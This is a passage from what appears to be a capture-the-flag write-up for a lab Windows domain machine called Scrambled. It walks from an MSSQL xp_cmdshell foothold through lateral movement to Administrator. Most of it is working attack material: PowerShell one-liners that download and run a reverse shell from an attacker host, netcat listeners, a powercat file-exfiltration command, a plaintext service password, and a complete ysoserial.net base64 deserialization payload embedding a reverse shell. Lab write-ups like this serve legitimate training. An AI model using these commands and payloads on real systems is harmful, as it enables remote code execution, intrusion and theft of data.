To get a reverse shell, we first download [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Then, start a basic web server with `python -m http.server 4094` so the target can download our reverse shell. Next, start a listener with `nc -nvlp 9014`. Finally, run `EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.98:4094/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.98 -Port 9014 | powershell -noprofile'` (command based on [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#mssqlclient.py)) to get a reverse shell.

## Lateral Movement

We are the `scrm\sqlsvc` user, but looking at the `Desktop` directory with `dir C:\Users\sqlsvc\Desktop` shows no flag. However, we have credentials for `MiscSvc` from the database. So, let's switch to that user and check for a flag.

We can run commands as that user with the following syntax:

```
$Password = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('scrm\MiscSvc', $Password)
Invoke-Command -Computer dc1 -Credential $Cred -Command {whoami}
```

The above should print `scrm\miscsvc`. Now we can start another listener with `nc -nvlp 9015` on our machine. Change into the `C:\Temp` directory on the target. Finally, run `Invoke-Command -Computer dc1 -Credential $Cred -Command {IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.98:4094/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.98 -Port 9015}` on the target to get a shell as `miscsvc`. This command will download [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and then run it like before with `xp_cmdshell`.

Finally, run `type C:\Users\miscsvc\Desktop\user.txt` to get the `user.txt` flag.

## Privilege Escalation

At the path `C:\Shares\IT\Apps\Sales Order Client` we have the following files:

```

    Directory: C:\Shares\IT\Apps\Sales Order Client


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       05/11/2021     20:52          86528 ScrambleClient.exe
-a----       05/11/2021     20:52          19456 ScrambleLib.dll
```

Download [powercat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) and make sure the Python web server is still running.

We can run `IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.98:4094/powercat.ps1')` to download and load `powercat`. Then, run `nc -nvlp 55628 > ScrambleClient.exe` on your machine and run `powercat -c 10.10.14.98 -p 55628 -i "C:\Shares\IT\Apps\Sales Order Client\ScrambleClient.exe"` on the target. Press CTRL+C in the netcat reciever when it's been long enough for the file to transfer. Do the same thing for `ScrambleLib.dll`.

Here are those files: [ScrambleClient.exe](ScrambleClient.exe) and [ScrambleLib.dll](ScrambleLib.dll).

The `file` command says `ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows`.

In the [Support machine writeup](../Support/README.md), we dealt with decompiling a .Net binary. I'm going to use [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy). Download the latest release from [the releases page](https://github.com/icsharpcode/AvaloniaILSpy/releases) and run it with `./ILSpy`.

We find a deserialization vulnerability in the `ScrambleLib.ScrambleNetClient.UploadOrder` function:

```c#
public void UploadOrder(SalesOrder NewOrder)
    {
        try
        {
            Log.Write("Uploading new order with reference " + NewOrder.ReferenceNumber);
            string text = NewOrder.SerializeToBase64();
            Log.Write("Order serialized to base64: " + text);
            ScrambleNetResponse scrambleNetResponse = SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.UploadOrder, text));
            ScrambleNetResponse.ResponseType type = scrambleNetResponse.Type;
            if (type == ScrambleNetResponse.ResponseType.Success)
            {
                Log.Write("Upload successful");
                return;
            }
            throw new ApplicationException(scrambleNetResponse.GetErrorDescription());
        }
        catch (Exception ex)
        {
            ProjectData.SetProjectError(ex);
            Exception ex2 = ex;
            Log.Write("Error: " + ex2.Message);
            throw ex2;
        }
    }
```

The constructor shows that the default port is `4411`, so this is the service we saw earlier:

```
public ScrambleNetClient()
    {
        Server = string.Empty;
        Port = 4411;
    }
```

In the `ScrambleLib.ScrambleNetRequest.GetCodeFromMessageType` function, we see:

```c#
public static string GetCodeFromMessageType(RequestType MsgType)
    {
        if (_MessageTypeToCode == null)
        {
            _MessageTypeToCode = new Dictionary<RequestType, string>();
            _MessageTypeToCode.Add(RequestType.CloseConnection, "QUIT");
            _MessageTypeToCode.Add(RequestType.ListOrders, "LIST_ORDERS");
            _MessageTypeToCode.Add(RequestType.AuthenticationRequest, "LOGON");
            _MessageTypeToCode.Add(RequestType.UploadOrder, "UPLOAD_ORDER");
        }
        return _MessageTypeToCode[MsgType];
    }
```

So, it looks like we need to use the `UPLOAD_ORDER` command.

We can use [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) to exploit the deserialization vulnerability. [This HackTricks page](https://book.hacktricks.xyz/pentesting-web/deserialization#ysoserial.net) discusses this program. This is a Windows application so I tried to run it with [Wine](https://www.winehq.org/). I needed to install Wine Mono, which I did by following [this AskUbuntu answer](https://askubuntu.com/a/992215). However, running the command using `wine` produces different output than running the command on native Windows. This took me a while to figure out since I didn't have a Windows VM handy.

The final command to run to create the exploit is `ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.98:4094/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.98 -Port 17019"`:

```
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAoAtBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMmdZOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0T0NJL1BnMEtQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaUJOWlhSb2IyUk9ZVzFsUFNKVGRHRnlkQ0lnU1hOSmJtbDBhV0ZzVEc5aFpFVnVZV0pzWldROUlrWmhiSE5sSWlCNGJXeHVjejBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3d2Y0hKbGMyVnVkR0YwYVc5dUlpQjRiV3h1Y3pwelpEMGlZMnh5TFc1aGJXVnpjR0ZqWlRwVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNN1lYTnpaVzFpYkhrOVUzbHpkR1Z0SWlCNGJXeHVjenA0UFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJK0RRb2dJRHhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW9nSUNBZ1BITmtPbEJ5YjJObGMzTStEUW9nSUNBZ0lDQThjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdJQ0FnSUR4elpEcFFjbTlqWlhOelUzUmhjblJKYm1adklFRnlaM1Z0Wlc1MGN6MGlMMk1nY0c5M1pYSnphR1ZzYkNCSlJWZ29UbVYzTFU5aWFtVmpkQ0JPWlhRdVYyVmlRMnhwWlc1MEtTNUViM2R1Ykc5aFpGTjBjbWx1WnlnbmFIUjBjRG92THpFd0xqRXdMakUwTGprNE9qUXdPVFF2U1c1MmIydGxMVkJ2ZDJWeVUyaGxiR3hVWTNBdWNITXhKeWs3U1c1MmIydGxMVkJ2ZDJWeVUyaGxiR3hVWTNBZ0xWSmxkbVZ5YzJVZ0xVbFFRV1JrY21WemN5QXhNQzR4TUM0eE5DNDVPQ0F0VUc5eWRDQXhOekF4T1NJZ1UzUmhibVJoY21SRmNuSnZja1Z1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVTNSaGJtUmhjbVJQZFhSd2RYUkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRlZ6WlhKT1lXMWxQU0lpSUZCaGMzTjNiM0prUFNKN2VEcE9kV3hzZlNJZ1JHOXRZV2x1UFNJaUlFeHZZV1JWYzJWeVVISnZabWxzWlQwaVJtRnNjMlVpSUVacGJHVk9ZVzFsUFNKamJXUWlJQzgrRFFvZ0lDQWdJQ0E4TDNOa09sQnliMk5sYzNNdVUzUmhjblJKYm1adlBnMEtJQ0FnSUR3dmMyUTZVSEp2WTJWemN6NE5DaUFnUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVQySnFaV04wU1c1emRHRnVZMlUrRFFvOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNEwL
```

We are using the reverse shell from before in this command.

Tip: Pipe the command directly to `xclip -selection clipboard` to automatically copy the output to your clipboard.

Start a listener with `nc -nvlp 17019`. Connect to service with `nc 10.10.11.168 4411`. Make sure the Python web server is still running with `python -m http.server 4094`. Send `UPLOAD_ORDER;` followed by the payload from before:

```
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAoAtBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMmdZOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0T0NJL1BnMEtQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaUJOWlhSb2IyUk9ZVzFsUFNKVGRHRnlkQ0lnU1hOSmJtbDBhV0ZzVEc5aFpFVnVZV0pzWldROUlrWmhiSE5sSWlCNGJXeHVjejBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3d2Y0hKbGMyVnVkR0YwYVc5dUlpQjRiV3h1Y3pwelpEMGlZMnh5TFc1aGJXVnpjR0ZqWlRwVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNN1lYTnpaVzFpYkhrOVUzbHpkR1Z0SWlCNGJXeHVjenA0UFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJK0RRb2dJRHhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW9nSUNBZ1BITmtPbEJ5YjJObGMzTStEUW9nSUNBZ0lDQThjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdJQ0FnSUR4elpEcFFjbTlqWlhOelUzUmhjblJKYm1adklFRnlaM1Z0Wlc1MGN6MGlMMk1nY0c5M1pYSnphR1ZzYkNCSlJWZ29UbVYzTFU5aWFtVmpkQ0JPWlhRdVYyVmlRMnhwWlc1MEtTNUViM2R1Ykc5aFpGTjBjbWx1WnlnbmFIUjBjRG92THpFd0xqRXdMakUwTGprNE9qUXdPVFF2U1c1MmIydGxMVkJ2ZDJWeVUyaGxiR3hVWTNBdWNITXhKeWs3U1c1MmIydGxMVkJ2ZDJWeVUyaGxiR3hVWTNBZ0xWSmxkbVZ5YzJVZ0xVbFFRV1JrY21WemN5QXhNQzR4TUM0eE5DNDVPQ0F0VUc5eWRDQXhOekF4T1NJZ1UzUmhibVJoY21SRmNuSnZja1Z1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVTNSaGJtUmhjbVJQZFhSd2RYUkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRlZ6WlhKT1lXMWxQU0lpSUZCaGMzTjNiM0prUFNKN2VEcE9kV3hzZlNJZ1JHOXRZV2x1UFNJaUlFeHZZV1JWYzJWeVVISnZabWxzWlQwaVJtRnNjMlVpSUVacGJHVk9ZVzFsUFNKamJXUWlJQzgrRFFvZ0lDQWdJQ0E4TDNOa09sQnliMk5sYzNNdVUzUmhjblJKYm1adlBnMEtJQ0FnSUR3dmMyUTZVSEp2WTJWemN6NE5DaUFnUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVQySnFaV04wU1c1emRHRnVZMlUrRFFvOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNEwL
```

Now, we can execute `type C:\Users\Administrator\Desktop\root.txt` to get the `root.txt` flag.

